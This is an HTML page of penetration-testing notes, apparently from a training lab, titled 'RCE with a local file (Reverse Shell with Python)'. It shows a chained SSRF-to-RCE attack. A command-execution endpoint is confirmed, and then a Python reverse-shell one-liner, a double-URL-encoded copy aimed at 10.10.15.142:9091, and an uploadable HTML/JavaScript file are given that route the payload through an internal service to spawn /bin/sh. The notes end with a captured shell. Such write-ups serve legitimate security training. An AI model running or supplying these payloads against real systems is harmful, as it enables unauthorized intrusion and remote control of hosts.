<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>RCE with a local file (Reverse Shell with Python)</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>RCE with a local file (Reverse Shell with Python)</h1><br/>7. Luckly we have discovered a file (not from the request above)<br />    <a href=""><img src="images/2569-1.png" alt="images/2569-1.png" /></a><br />    By studying the source code above, <br />    we notice a functionality that allows us to execute commands on the remote host sending a GET request to /runme?x=&lt;CMD&gt;.<br />    Let us confirm remote code execution by sending whoami as a command.<br />    <a href=""><img src="images/2569-2.png" alt="images/2569-2.png" /></a><br /><br />8.  Bash reverse shell payload that use Python to spawn a shell. <br />    <div class="codebox"><pre>export RHOST=&quot;&lt;VPN/TUN IP&gt;&quot;;export RPORT=&quot;&lt;PORT&gt;&quot;;python -c &#39;import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(&quot;RHOST&quot;),int(os.getenv(&quot;RPORT&quot;))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(&quot;/bin/sh&quot;)&#39;</pre></div><br />   1) Change the parameter: RHOST and RPORT<br />      <a href=""><img src="images/2569-3.png" alt="images/2569-3.png" /></a><br />   2) Url Encode the payload 2 times as we have done also in the chapter above with <a href="https://www.urlencoder.org/">urlencoder.org</a>. We do that because we pass them through 2 different web applications.<br />      <div class="codebox"><pre>export%2520RHOST%253D%252210.10.15.142%2522%253Bexport%2520RPORT%253D%25229091%2522%253Bpython%2520-c%2520%2527import%2520sys%252Csocket%252Cos%252Cpty%253Bs%253Dsocket.socket%2528%2529%253Bs.connect%2528%2528os.getenv%2528%2522RHOST%2522%2529%252Cint%2528os.getenv%2528%2522RPORT%2522%2529%2529%2529%2529%253B%255Bos.dup2%2528s.fileno%2528%2529%252Cfd%2529%2520for%2520fd%2520in%2520%25280%252C1%252C2%2529%255D%253Bpty.spawn%2528%2522%252Fbin%252Fsh%2522%2529%2527</pre></div><br />   3) Since we can upload an html file like in the chapter <a href="-side--Server_Side_Attacks--Server_Side_Request_Forgery_(SSRF)--Attacks--Blind_SSRF_vulnerabilities--Blind_SSRF_File_Upload_PDF_Converter.html">Blind SSRF: File Upload PDF Converter</a><br />      <div class="codebox"><pre>&lt;html&gt;<br />    &lt;body&gt;<br />        &lt;b&gt;Reverse Shell via Blind SSRF&lt;/b&gt;<br />        &lt;script&gt;<br />        var http = new XMLHttpRequest();<br />        http.open(&quot;GET&quot;,&quot;http://internal.app.local/load?q=http::////127.0.0.1:5000/runme?x=export%2520RHOST%253D%252210.10.15.142%2522%253Bexport%2520RPORT%253D%25229091%2522%253Bpython%2520-c%2520%2527import%2520sys%252Csocket%252Cos%252Cpty%253Bs%253Dsocket.socket%2528%2529%253Bs.connect%2528%2528os.getenv%2528%2522RHOST%2522%2529%252Cint%2528os.getenv%2528%2522RPORT%2522%2529%2529%2529%2529%253B%255Bos.dup2%2528s.fileno%2528%2529%252Cfd%2529%2520for%2520fd%2520in%2520%25280%252C1%252C2%2529%255D%253Bpty.spawn%2528%2522%252Fbin%252Fsh%2522%2529%2527&quot;, true); <br />        http.send();<br />        http.onerror = function(){document.write(&#39;&lt;a&gt;Oops!&lt;/a&gt;&#39;);}<br />        &lt;/script&gt;<br />    &lt;/body&gt;<br />&lt;/html&gt;</pre></div><br />       <a href=""><img src="images/2569-4.png" alt="images/2569-4.png" /></a><br />   4)Got the reverse shell<br />     <a href=""><img src="images/2569-5.png" alt="images/2569-5.png" /></a><br />     <a href=""><img src="images/2569-6.png" alt="images/2569-6.png" /></a></div>
</body>
</html>
